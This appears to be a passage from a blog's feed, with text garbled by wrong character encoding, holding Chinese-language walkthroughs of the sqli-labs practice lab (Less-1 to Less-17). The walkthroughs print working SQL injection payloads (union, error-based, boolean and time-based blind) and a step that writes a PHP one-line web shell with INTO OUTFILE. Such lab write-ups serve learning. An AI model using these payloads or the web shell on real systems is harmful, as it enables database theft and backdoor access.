    <content type="html"><![CDATA[<h1>sqli-labs(ä¸‰)</h1><h2 id="Less-11"><a class="header-anchor" href="#Less-11">ğŸ­</a>Less-11</h2><p>less-11ä¸ºpostæ³¨å…¥ï¼Œpostå°±æ˜¯æ•°æ®ä»å®¢æˆ·ç«¯æäº¤åˆ°æœåŠ¡å™¨ç«¯,è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ä¼šä»¥è¡¨å•çš„å½¢å¼æäº¤åˆ°æœåŠ¡å™¨è¿›è¡ŒéªŒè¯ã€‚</p><h4 id="1-è¯•æ¢"><a class="header-anchor" href="#1-è¯•æ¢">ğŸ­</a>1.è¯•æ¢</h4><p>ç”¨ä¹‹å‰çš„1æ— ååº”ï¼Œè¯•ç€ä½¿ç”¨å¸¸ç”¨çš„ç®¡ç†å‘˜å¯†ç è´¦æˆ· admin(Dumbä¹Ÿè¡Œ)ï¼ŒæˆåŠŸç™»å½•ï¼›åŠ å•å¼•å·æ³¨å…¥ï¼Œå¯†ç éšæ„ï¼ŒæŠ¥é”™ã€‚</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/1.jpg" alt="1"></p><p>æ ¹æ®æŠ¥é”™å¯ä»¥åˆ¤æ–­å‡ºè¯¥å¤„ä¸ºå•å¼•å·æ³¨å…¥ï¼Œä½¿ç”¨ä¸‡èƒ½å¯†ç <code>admin'or'1'='1#</code>ï¼ˆor â€˜1â€™='1æ’æˆç«‹ï¼Œæ‰€ä»¥è¯­å¥æ’çœŸï¼‰å°†å…¶æ³¨é‡Šï¼›å›æ˜¾æ­£å¸¸ï¼Œç¡®å®šä¸ºå•å¼•å·æ³¨å…¥ã€‚</p><h4 id="2-çˆ†åº“å"><a class="header-anchor" href="#2-çˆ†åº“å">ğŸ­</a>2.çˆ†åº“å</h4><p>ç”¨<code>union select 1,database()-- #</code>æŸ¥è¯¢ï¼Œè¯­å¥æ”¾åœ¨ç”¨æˆ·åæˆ–å¯†ç éƒ½å¯ä»¥ã€‚</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/2.jpg" alt="2"></p><h4 id="3-çˆ†è¡¨"><a class="header-anchor" href="#3-çˆ†è¡¨">ğŸ­</a>3.çˆ†è¡¨</h4><p>æ¥ä¸‹æ¥æ­¥éª¤ä¸å‰é¢å…³å¡ç±»ä¼¼</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/3.jpg" alt="3"></p><h4 id="4-çˆ†å­—æ®µ4"><a class="header-anchor" href="#4-çˆ†å­—æ®µ4">ğŸ­</a>4.çˆ†å­—æ®µ<img src="/2020/11/22/sqli-labs%E4%B8%89/4.jpg" alt="4"></h4><h4 id="5-çˆ†å€¼5"><a class="header-anchor" href="#5-çˆ†å€¼5">ğŸ­</a>5.çˆ†å€¼<img src="/2020/11/22/sqli-labs%E4%B8%89/5.jpg" alt="5"></h4><h2 id="Less-12"><a class="header-anchor" href="#Less-12">ğŸ­</a>Less-12</h2><p>è¯•æ¢å‡ºè¯¥å¤„ä¸ºåŒå¼•å·é—­åˆæ³¨å…¥ï¼Œå…¶ä½™æ­¥éª¤ç±»ä¼¼ã€‚</p><h2 id="6"><a class="header-anchor" href="#6">ğŸ­</a><img src="/2020/11/22/sqli-labs%E4%B8%89/6.jpg" alt="6"></h2><h2 id="Less-13"><a class="header-anchor" href="#Less-13">ğŸ­</a>Less-13</h2><h4 id="1-è¯•æ¢7"><a class="header-anchor" href="#1-è¯•æ¢7">ğŸ­</a>1.è¯•æ¢<img src="/2020/11/22/sqli-labs%E4%B8%89/7.jpg" alt="7"></h4><p>æŸ¥è¯¢æºä»£ç å¯çŸ¥è¯¥å…³å¡ç™»å½•æˆåŠŸåªè¿”å›å›¾ç‰‡ä¸è¿”å›ç»“æœï¼›å› æ­¤å¯é‡‡ç”¨å¸ƒå°”ç›²æ³¨æˆ–æ—¶é—´ç›²æ³¨ã€‚</p><h4 id="2-çˆ†åº“å8"><a class="header-anchor" href="#2-çˆ†åº“å8">ğŸ­</a>2.çˆ†åº“å<img src="/2020/11/22/sqli-labs%E4%B8%89/8.jpg" alt="8"></h4><h4 id="3-çˆ†è¡¨9"><a class="header-anchor" href="#3-çˆ†è¡¨9">ğŸ­</a>3.çˆ†è¡¨<img src="/2020/11/22/sqli-labs%E4%B8%89/9.jpg" alt="9"></h4><p>æ¥ä¸‹å»ä¸less-6æåˆ°çš„æŠ¥é”™æ­¥éª¤ç›¸ä¼¼ï¼Œä¸å†èµ˜è¿°ã€‚</p><h2 id="Less-14"><a class="header-anchor" href="#Less-14">ğŸ­</a>Less-14</h2><h4 id="1-è¯•æ¢10"><a class="header-anchor" href="#1-è¯•æ¢10">ğŸ­</a>1.è¯•æ¢<img src="/2020/11/22/sqli-labs%E4%B8%89/10.jpg" alt="10"></h4><p>å…¶ä½™ä¸ä¸Šè¿°å…³å¡ç±»ä¼¼ã€‚</p><h2 id="Less-15"><a class="header-anchor" href="#Less-15">ğŸ­</a>Less-15</h2><h4 id="1-è¯•æ¢-v2"><a class="header-anchor" href="#1-è¯•æ¢-v2">ğŸ­</a>1.è¯•æ¢</h4><p>æœ¬å…³å¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨æˆ–æ—¶é—´æ³¨å…¥ã€‚</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/11.jpg" alt="11"></p><p><strong>æ³¨æ„</strong>:&amp;passwd=1ä¸èƒ½å°‘ï¼Œå› ä¸ºåå°æºç ä¸­è®¾ç½®unameå’Œpasswdè¿™ä¸¤ä¸ªå‚æ•°ä»»ä½•ä¸€ä¸ªéƒ½ä¸èƒ½ä¸ºç©ºï¼Œä¸€æ—¦å…¶ä¸­ä¸€ä¸ªä¸ºç©ºå°†ä¸ä¼šæ‰§è¡ŒSQLè¯­å¥</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/15.jpg" alt="15"></p><h4 id="2-çˆ†åº“å-v2"><a class="header-anchor" href="#2-çˆ†åº“å-v2">ğŸ­</a>2.çˆ†åº“å</h4><p>åº“åï¼š</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/16.jpg" alt="16"></p><p>ä¹‹åè¯­å¥çš†ä¸less-8ä¸€æ ·ã€‚</p><h2 id="Less-1612"><a class="header-anchor" href="#Less-1612">ğŸ­</a>Less-16<img src="/2020/11/22/sqli-labs%E4%B8%89/12.jpg" alt="12"></h2><p>å…¶ä½™ä¸15å…³ç±»ä¼¼ã€‚</p><h2 id="Less-17"><a class="header-anchor" href="#Less-17">ğŸ­</a>Less-17</h2><p>å…ˆçœ‹æºä»£ç </p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/18.jpg" alt="18"></p><p>unameç”¨check_input()å‡½æ•°è¿›è¡Œäº†å¤„ç†ï¼Œåªæˆªå–15ä¸ªå­—ç¬¦ï¼›</p><p>get_magic_quotes_gpc()ç”¨äºåˆ¤æ–­è§£æç”¨æˆ·æç¤ºçš„æ•°æ®ï¼Œç‰¹åˆ«æ˜¯postã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ã€‚</p><p>stripslashes()åˆ é™¤ç”± addslashes() å‡½æ•°æ·»åŠ çš„åæ–œæ </p><p>ctype_digit()åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°å­—ï¼Œæ˜¯æ•°å­—å°±è¿”å›trueï¼Œå¦åˆ™è¿”å›false</p><p>mysql_real_escape_string()è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</p><p>intval()   æ•´å‹è½¬æ¢ä¸€ç³»åˆ—è¿‡æ»¤è¿‡äºéº»çƒ¦ï¼Œæ•…ä»passwordæ³¨å…¥ã€‚</p><h4 id="1-è¯•æ¢-v3"><a class="header-anchor" href="#1-è¯•æ¢-v3">ğŸ­</a>1.è¯•æ¢</h4><p><img src="/2020/11/22/sqli-labs%E4%B8%89/19.jpg" alt="19"></p><p>ç¡®å®šä¸ºå•å¼•å·æ³¨å…¥ã€‚</p><h4 id="2-çˆ†åº“å-v3"><a class="header-anchor" href="#2-çˆ†åº“å-v3">ğŸ­</a>2.çˆ†åº“å</h4><p>ä¹‹å‰æŠ¥é”™è¯•è¿‡updatexmlï¼Œè¿™å…³è¯•çœ‹çœ‹floor()å’Œextractvalue()ã€‚</p><p>floor()ï¼šæ¯”è¾ƒéº»çƒ¦</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/20.jpg" alt="20"></p><p>extractvalue()ï¼šä¸updatexmlç›¸ä¼¼</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/22.jpg" alt="22"></p><p>å…¶ä½™æ­¥éª¤ä¸å†èµ˜è¿°ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labsï¼ˆäºŒï¼‰</title>
    <link href="/2020/11/09/sqli-labs/"/>
    <url>/2020/11/09/sqli-labs/</url>
    
    <content type="html"><![CDATA[<h1>Sqli-labsâ€“2</h1><ul><li><a href="#sqli-labs--2">Sqli-labsâ€“2</a><ul><li><a href="#%E6%B3%95%E4%B8%80%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">æ³•ä¸€:è”åˆæ³¨å…¥</a><ul><li><a href="#%E7%9B%B2%E6%B3%A8%E7%8C%9C%E8%A7%A3less-5">ç›²æ³¨çŒœè§£Less-5</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2">1.è¯•æ¢:</a></li><li><a href="#2%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6">2.<strong>çŒœæ•°æ®åº“åé•¿åº¦</strong>:</a></li><li><a href="#3%E7%8C%9C%E5%BA%93%E5%90%8D">3.<strong>çŒœåº“åï¼š</strong></a></li><li><a href="#4%E7%88%86%E8%A1%A8"><strong>4.çˆ†è¡¨ï¼š</strong></a></li><li><a href="#5%E7%88%86%E5%88%97"><strong>5.çˆ†åˆ—ï¼š</strong></a></li><li><a href="#6%E7%88%86%E5%80%BC"><strong>6.çˆ†å€¼ï¼š</strong></a></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%BA%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥</a><ul><li><a href="#less-6">Less-6</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-1">1.è¯•æ¢</a></li><li><a href="#2%E7%88%86%E5%BA%93%E5%90%8D">2.çˆ†åº“å</a></li><li><a href="#3%E7%88%86%E8%A1%A8">3.çˆ†è¡¨</a></li><li><a href="#4%E7%88%86%E5%88%97">4.çˆ†åˆ—</a></li><li><a href="#5%E7%88%86%E5%80%BC">5.çˆ†å€¼</a></li></ul></li><li><a href="#less-7">Less-7</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-2">1.è¯•æ¢</a></li><li><a href="#2%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">2.è·å–æ–‡ä»¶è·¯å¾„</a><ul><li><a href="#%E6%B3%95%E4%B8%80">æ³•ä¸€ï¼š</a></li><li><a href="#%E6%B3%95%E4%BA%8C">æ³•äºŒï¼š</a></li></ul></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%B8%89%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">æ³•ä¸‰ï¼šæ—¶é—´ç›²æ³¨</a></li><li><a href="#less-8">Less-8</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-3">1.è¯•æ¢</a></li><li><a href="#2%E7%88%86%E5%BA%93%E9%95%BF">2.çˆ†åº“é•¿</a></li><li><a href="#3%E7%88%86%E5%BA%93">3.çˆ†åº“</a></li><li><a href="#4%E7%88%86%E8%A1%A8-1">4.çˆ†è¡¨</a></li><li><a href="#5%E7%88%86%E5%88%97-1">5.çˆ†åˆ—</a></li><li><a href="#6%E7%88%86%E5%80%BC-1">6.çˆ†å€¼</a></li><li><a href="#less-9">Less-9</a></li><li><a href="#less-10">Less-10</a></li></ul></li></ul></li></ul><h2 id="æ³•ä¸€-è”åˆæ³¨å…¥"><a class="header-anchor" href="#æ³•ä¸€-è”åˆæ³¨å…¥">ğŸ­</a>æ³•ä¸€:è”åˆæ³¨å…¥</h2><h3 id="ç›²æ³¨çŒœè§£Less-5"><a class="header-anchor" href="#ç›²æ³¨çŒœè§£Less-5">ğŸ­</a>ç›²æ³¨çŒœè§£Less-5</h3><h4 id="1-è¯•æ¢"><a class="header-anchor" href="#1-è¯•æ¢">ğŸ­</a>1.è¯•æ¢:</h4><p>æ’å…¥<code>?id=1'</code>æŠ¥é”™ï¼Œä½†æœªæŠ¥é”™æ—¶é¡µé¢å¹¶æ²¡æœ‰ä»»ä½•ä¿¡æ¯çš„å›æ˜¾ï¼›æ‰§è¡ŒSQLè¯­å¥åï¼Œè‹¥è¯­å¥æŸ¥è¯¢åˆ°åŒ¹é…çš„æ•°æ®ä¼šæ˜¾ç¤ºâ€˜You are inâ€¦â€¦å¦‚æœSQLè¯­å¥æ²¡æœ‰æŸ¥è¯¢åˆ°åŒ¹é…çš„æ•°æ®å°±ä¸å›æ˜¾ï¼›å¦‚æœè¯­å¥æœ‰é”™è¯¯å°±æ˜¾ç¤ºé”™è¯¯çš„ä¿¡æ¯ï¼›æ•…åˆ¤æ–­å…¶ä¸ºç›²æ³¨ã€‚å‰å››èŠ‚éƒ½æ˜¯é€šè¿‡é—­åˆsqlè¯­å¥æ³¨å…¥ï¼Œè¿™é‡Œåªèƒ½é€šè¿‡æ•°æ®åº“æŠ¥é”™æ¥è·å–æƒ³è¦çš„æ•°æ®ï¼ŒåŸç†ï¼šå°†group byä¸ä¸€ä¸ªèšåˆå‡½æ•°ä¸€èµ·ä½¿ç”¨ï¼Œå¦‚count(*)ï¼Œå¯ä»¥å°†æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ä½œä¸ºé”™è¯¯ä¿¡æ¯è¿”å›ã€‚</p><h4 id="2-çŒœæ•°æ®åº“åé•¿åº¦"><a class="header-anchor" href="#2-çŒœæ•°æ®åº“åé•¿åº¦">ğŸ­</a>2.<strong>çŒœæ•°æ®åº“åé•¿åº¦</strong>:</h4><p><code>â€™ and length (database())=8--+</code>è¯•åˆ°8æ—¶å›æ˜¾æ­£å¸¸</p><p><img src="/2020/11/09/sqli-labs/1.jpg" alt="1"></p><h4 id="3-çŒœåº“åï¼š"><a class="header-anchor" href="#3-çŒœåº“åï¼š">ğŸ­</a>3.<strong>çŒœåº“åï¼š</strong></h4><p><code>' and left((select database()),1)='s'--+</code>å›æ˜¾æ­£å¸¸ï¼Œå†æ¢å¯»ç¬¬äºŒä¸ªå­—æ¯<code>' and left((select database()),2)='sy'--+</code>æŠ¥é”™ï¼š</p><p><img src="/2020/11/09/sqli-labs/3.jpg" alt="3"></p><p>å°†yæ¢æˆeåæ­£å¸¸ï¼Œä¾æ¬¡æ¨å‡ºå…«ä½æ•°ï¼ˆç»æ¼«é•¿çš„è¯•æ¢â€¦ï¼‰å¾—å‡ºåº“åsecurityã€‚securityçš„åå…­è¿›åˆ¶=<strong>0x7365637572697479</strong></p><h4 id="4-çˆ†è¡¨ï¼š"><a class="header-anchor" href="#4-çˆ†è¡¨ï¼š">ğŸ­</a><strong>4.çˆ†è¡¨ï¼š</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p><p><img src="/2020/11/09/sqli-labs/4.jpg" alt="4"></p><h4 id="5-çˆ†åˆ—ï¼š"><a class="header-anchor" href="#5-çˆ†åˆ—ï¼š">ğŸ­</a><strong>5.çˆ†åˆ—ï¼š</strong></h4><p><code> union Select 1,count(*),concat(0x3a,0x3a,( select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name='users' limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/5.jpg" alt="5"></p><h4 id="6-çˆ†å€¼ï¼š"><a class="header-anchor" href="#6-çˆ†å€¼ï¼š">ğŸ­</a><strong>6.çˆ†å€¼ï¼š</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/6.jpg" alt="6"></p><h2 id="æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥"><a class="header-anchor" href="#æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥">ğŸ­</a>æ³•äºŒï¼šæŠ¥é”™æ³¨å…¥</h2><h3 id="Less-6"><a class="header-anchor" href="#Less-6">ğŸ­</a>Less-6</h3><h4 id="1-è¯•æ¢-v2"><a class="header-anchor" href="#1-è¯•æ¢-v2">ğŸ­</a>1.è¯•æ¢</h4><p>ç”¨<code>?id=1&quot;</code>æ—¶æŠ¥é”™ï¼ŒåŠ ä¸Š<code>--+</code>æ—¶å›æ˜¾æ­£å¸¸ã€‚</p><h4 id="2-çˆ†åº“å"><a class="header-anchor" href="#2-çˆ†åº“å">ğŸ­</a>2.çˆ†åº“å</h4><p><code>and updatexml(1,concat(0x7e,database(),0x7e),1)%23 </code>(0x7eæ˜¯åå…­è¿›åˆ¶çš„â€œ~â€)</p><p><img src="/2020/11/09/sqli-labs/10.jpg" alt="10"></p><h4 id="3-çˆ†è¡¨"><a class="header-anchor" href="#3-çˆ†è¡¨">ğŸ­</a>3.çˆ†è¡¨</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</code></p><p><img src="/2020/11/09/sqli-labs/11.jpg" alt="11"></p><h4 id="4-çˆ†åˆ—"><a class="header-anchor" href="#4-çˆ†åˆ—">ğŸ­</a>4.çˆ†åˆ—</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)%23</code></p><p><img src="/2020/11/09/sqli-labs/12.jpg" alt="12"></p><h4 id="5-çˆ†å€¼"><a class="header-anchor" href="#5-çˆ†å€¼">ğŸ­</a>5.çˆ†å€¼</h4><p><code>and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23</code>å› updatexml()å‡½æ•°æœ€å¤šåªèƒ½çˆ†32ä¸ªå­—ç¬¦æ•…ç”¨<code>limit 0,1</code>ä¸€ä¸€æŸ¥è¯¢</p><p><img src="/2020/11/09/sqli-labs/13.jpg" alt="13"></p><p><img src="/2020/11/09/sqli-labs/18.jpg" alt="18"></p><p>â€¦è¿˜æœ‰å¾ˆå¤šï¼Œä¸ä¸€ä¸€åˆ—ä¸¾ã€‚</p><h3 id="Less-7"><a class="header-anchor" href="#Less-7">ğŸ­</a>Less-7</h3><h4 id="1-è¯•æ¢-v3"><a class="header-anchor" href="#1-è¯•æ¢-v3">ğŸ­</a>1.è¯•æ¢</h4><p>è¾“å…¥<code>id=1'</code>æŠ¥é”™ï¼Œç”¨â€“+æ³¨é‡Šæ‰åä»æŠ¥é”™ï¼›å°è¯•åŠ ä¸€ä¸ªæ‹¬å·ï¼Œè¿˜æ˜¯æŠ¥é”™ï¼Œå†åŠ ä¸€ä¸ªï¼Œå›æ˜¾æ­£å¸¸ã€‚<img src="/2020/11/09/sqli-labs/8.jpg" alt="8"></p><h4 id="2-è·å–æ–‡ä»¶è·¯å¾„"><a class="header-anchor" href="#2-è·å–æ–‡ä»¶è·¯å¾„">ğŸ­</a>2.è·å–æ–‡ä»¶è·¯å¾„</h4><p>ç§‘æ™®å°çŸ¥è¯†ï¼š</p><p>@@datadir è¯»å–æ•°æ®åº“è·¯å¾„;@@basedir MYSQL è·å–å®‰è£…è·¯å¾„</p><p>ä¸€å¥è¯æœ¨é©¬:æœ¬å…³ç”¨åˆ°phpç‰ˆæœ¬çš„ä¸€å¥è¯æœ¨é©¬ï¼š<code>&lt;?php @eval($_POST[â€œcmdâ€]);?&gt; </code></p><p>load_file(): è¯»å–æœ¬åœ°æ–‡ä»¶; into outfile :å†™æ–‡ä»¶;</p><p>ç”¨å‘½ä»¤<code>union select 1,@@basedir,@@datadir --+</code>åœ¨ä½å…³å¡æŸ¥è¯¢æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„<img src="/2020/11/09/sqli-labs/9.jpg" alt="9"></p><h6 id="æ³•ä¸€ï¼š"><a class="header-anchor" href="#æ³•ä¸€ï¼š">ğŸ­</a>æ³•ä¸€ï¼š</h6><p>æ ¹æ®ä»¥ä¸ŠæŸ¥è¯¢çš„æ–‡ä»¶åœ°å€ä½¿ç”¨<code>?id=1')) union select 1,2,'&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;' into outfile &quot;D:\\phpstudy_pro\WWW\\sql\\hhh.php&quot;--+</code>è¯­å¥æ–°å»ºphpæ–‡ä»¶ä¾¿äºåç»­é—¯å…³ã€‚(<strong>è·¯å¾„éœ€è¦ç”¨<code>\\</code>è¿™ç‚¹ä¸€å®šè¦è®°ä½</strong>)</p><p>èšå‰‘:</p><p><img src="/2020/11/09/sqli-labs/26.jpg" alt="26"></p><p>æ³¨ï¼šå¯†ç ä¸ºæœ¨é©¬è¯­å¥postæ¡†é‡Œçš„å†…å®¹ã€‚</p><p>æ‰“å¼€ï¼š</p><p><img src="/2020/11/09/sqli-labs/27.jpg" alt="27"></p><p>ä¹Ÿå¯ä»¥ç”¨èœåˆ€ï¼š</p><p><img src="/2020/11/09/sqli-labs/28.jpg" alt="28"></p><p>è·¯å¾„é‡Œçš„æ–‡ä»¶åä¸€å®šè¦å¯¹ï¼Œæˆ‘åˆšå¼€å§‹ä¸‹äº†èœåˆ€ï¼Œç„¶åçœ‹äº†ä¸€ä¸ªæ•™ç¨‹é‡Œé¢å¯¹æ–‡ä»¶å‘½åä¸ºtest.php;æˆ‘è‡ªå·±å‘½åä¸ºhhh.phpï¼Œç„¶åå†ç¼–è¾‘æ•°æ®çš„æ—¶å€™è¾“å…¥äº†test.phpâ€¦ä¸ºæ­¤æˆ‘è¿˜è§‰å¾—æ˜¯èœåˆ€å‡ºäº†é—®é¢˜ï¼Œç„¶åä¸‹äº†èšå‰‘ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œæœ€åå‘ç°æˆ‘çš„æ–‡ä»¶åé”™äº†ï¼ï¼!å› ä¸ºè¿™ä¸ªæ†¨æ†¨é—®é¢˜ï¼Œæˆ‘ä»13å·æ™šä¸Šå¼€å§‹å›°æƒ‘äº†ä¸€å¤©â€¦</p><h6 id="æ³•äºŒï¼š"><a class="header-anchor" href="#æ³•äºŒï¼š">ğŸ­</a>æ³•äºŒï¼š</h6><p>ä½¿ç”¨<code>?id=1')) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;--+</code></p><p>å¯ä»¥åœ¨ç›®å½•ä¸‹å‘ç°text.phpæ–‡ä»¶</p><p><img src="/2020/11/09/sqli-labs/19.jpg" alt="19"></p><p>çˆ†æ•°æ®åº“å</p><p><code>union select 1,user(),database() into outfile D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\a.php&quot;</code><img src="/2020/11/09/sqli-labs/21.jpg" alt="21"></p><p>çˆ†è¡¨</p><p><code>union select 1,2,table_name from information_schema.tables where table_schema='security' into outfile</code></p><p><img src="/2020/11/09/sqli-labs/22.jpg" alt="22"></p><p>çˆ†å­—æ®µ</p><p><code>union select 1,2,column_name from information_schema.columns where table_schema='security' and table_name='users' into outfile</code><img src="/2020/11/09/sqli-labs/23.jpg" alt="23"></p><p>çˆ†å€¼</p><p><code>union select * from users into outfile</code><img src="/2020/11/09/sqli-labs/24.jpg" alt="24"></p><h2 id="æ³•ä¸‰ï¼šæ—¶é—´ç›²æ³¨"><a class="header-anchor" href="#æ³•ä¸‰ï¼šæ—¶é—´ç›²æ³¨">ğŸ­</a>æ³•ä¸‰ï¼šæ—¶é—´ç›²æ³¨</h2><h2 id="Less-8"><a class="header-anchor" href="#Less-8">ğŸ­</a>Less-8</h2><h4 id="1-è¯•æ¢-v4"><a class="header-anchor" href="#1-è¯•æ¢-v4">ğŸ­</a>1.è¯•æ¢</h4><p><code>id=1'</code>æŠ¥é”™ï¼Œç”¨<code>--+</code>æ³¨é‡Šåå›æ˜¾æ­£å¸¸ã€‚ï¼ˆå…¶å®æ ‡é¢˜å°±çœ‹å¾—å‡ºæ¥â€¦ï¼‰</p><h4 id="2-çˆ†åº“é•¿"><a class="header-anchor" href="#2-çˆ†åº“é•¿">ğŸ­</a>2.çˆ†åº“é•¿</h4><p><code>?id=1' and if(length(database())=8,sleep(5),1)--+</code><img src="/2020/11/09/sqli-labs/25.jpg" alt="25"></p><p>å›¾ä¸­åœˆåœˆåœ¨å€¼ä¸º8çš„æ—¶å€™å»¶è¿Ÿäº†ï¼Œæ•…å€¼ä¸º8</p><h4 id="3-çˆ†åº“"><a class="header-anchor" href="#3-çˆ†åº“">ğŸ­</a>3.çˆ†åº“</h4><p><code>?id=1' and if(left(database(),1)='s',sleep(5),1)--+</code></p><p>ä¸ä¸Šè¿°ä¸€æ ·æ•…å€¼ä¸ºs;æ¥ç€å¢åŠ left(database(),å­—ç¬¦é•¿åº¦)ä¸­çš„å­—ç¬¦é•¿åº¦ï¼Œç­‰å·å³è¾¹ä¾æ¬¡çˆ†ç ´ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œæ­£ç¡®åŒ¹é…æ—¶ä¼šå»¶è¿Ÿï¼Œï¼ˆç»è¿‡æ¼«é•¿è¯•æ¢ï¼‰æœ€ç»ˆçˆ†ç ´å¾—åˆ°left(database(),8)=â€˜securityâ€™ã€‚</p><h4 id="4-çˆ†è¡¨"><a class="header-anchor" href="#4-çˆ†è¡¨">ğŸ­</a>4.çˆ†è¡¨</h4><p><code>?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users' ,sleep(5),1)--+</code></p><p>å¾—å‡ºè¡¨åä¸ºusersã€‚</p><h4 id="5-çˆ†åˆ—"><a class="header-anchor" href="#5-çˆ†åˆ—">ğŸ­</a>5.çˆ†åˆ—</h4><p><code>?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 5,1),8)='password' ,sleep(5),1) --+</code></p><p>åœ¨limit5,1çš„æ—¶å€™æŸ¥åˆ°äº†passwordï¼Œåœ¨limit4,1æ—¶æŸ¥åˆ°äº†username.</p><h4 id="6-çˆ†å€¼"><a class="header-anchor" href="#6-çˆ†å€¼">ğŸ­</a>6.çˆ†å€¼</h4><p><code>?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+</code></p><p><code>?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+</code></p><p>æ‰€ä»¥ç¬¬ä¸€ä¸ªç”¨æˆ·çš„åå­—dumbï¼Œå¯†ç dumbï¼›åœ¨ç»è¿‡æ¼«é•¿çš„å°è¯•ä¾æ¬¡æŸ¥å‡ºå…¶ä½™çš„å€¼ã€‚</p><h3 id="Less-9"><a class="header-anchor" href="#Less-9">ğŸ­</a>Less-9</h3><p>è¾“å…¥ä¸€ç³»åˆ—ç¬¦å·ï¼Œå‘ç°ä¸€ç›´you are in â€¦;åˆ¤æ–­ä¸ºæ—¶é—´ç›²æ³¨ã€‚è¾“å…¥<code>?id=1' and sleep(5) --+</code>æ‰€ä»¥ä¸ºå•å¼•å·ç›²æ³¨ã€‚æ¥ä¸‹å»å’Œç¬¬å…«å…³çš„æ—¶é—´ç›²æ³¨æ­¥éª¤ç›¸ä¼¼ã€‚</p><h3 id="Less-10"><a class="header-anchor" href="#Less-10">ğŸ­</a>Less-10</h3><p>è¯•æ¢ä¸ºæ—¶é—´ç›²æ³¨ï¼Œ<code>?id=1&quot; and sleep(5) --+</code>å»¶è¿Ÿï¼Œæ•…ä¸ºåŒå¼•å·ç›²æ³¨ï¼Œæ¥ä¸‹å»ä¸ç¬¬å…«å…³ç›¸ä¼¼ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labsï¼ˆä¸€ï¼‰</title>
    <link href="/2020/11/08/sqli/"/>
    <url>/2020/11/08/sqli/</url>
    
    <content type="html"><![CDATA[<h1>Sqli-labs</h1><p>æœ¬ç¯‡æ–‡ç« è¿ç”¨çš„æ³¨å…¥è¯­å¥å·²åœ¨sqliåŸºç¡€ä¸­è¯´æ˜ï¼Œæ•…è¿ç”¨æ—¶ä¸å†è§£é‡ŠåŸå› ã€‚</p><h2 id="ç±»å‹åˆ¤æ–­"><a class="header-anchor" href="#ç±»å‹åˆ¤æ–­">ğŸ­</a>ç±»å‹åˆ¤æ–­</h2><ol><li><code>?id=1 and 1=2 --+</code>è‹¥è¿”å›ç»“æœæ­£å¸¸ï¼Œè¯´æ˜ä¸æ˜¯æ•°å­—ç±»å‹ï¼›</li><li><code>?id=1' --+</code> æ˜¾ç¤ºä¸æ­£å¸¸,<code>?id=1') --+ </code>æ˜¾ç¤ºæ­£å¸¸æ—¶ï¼Œè¯¥ç±»å‹ä¸ºå­—ç¬¦æ³¨å…¥ï¼Œä¸”ä»¥(â€˜â€™)çš„æ–¹å¼é—­åˆå­—ç¬¦ä¸²ï¼Œè¿˜æœ‰(â€œâ€)ç±»ä¼¼ã€‚</li></ol><h2 id="Less-1"><a class="header-anchor" href="#Less-1">ğŸ­</a>Less-1</h2><h4 id="æ³•ä¸€ï¼šUNIONè”åˆæŸ¥è¯¢æ³¨å…¥"><a class="header-anchor" 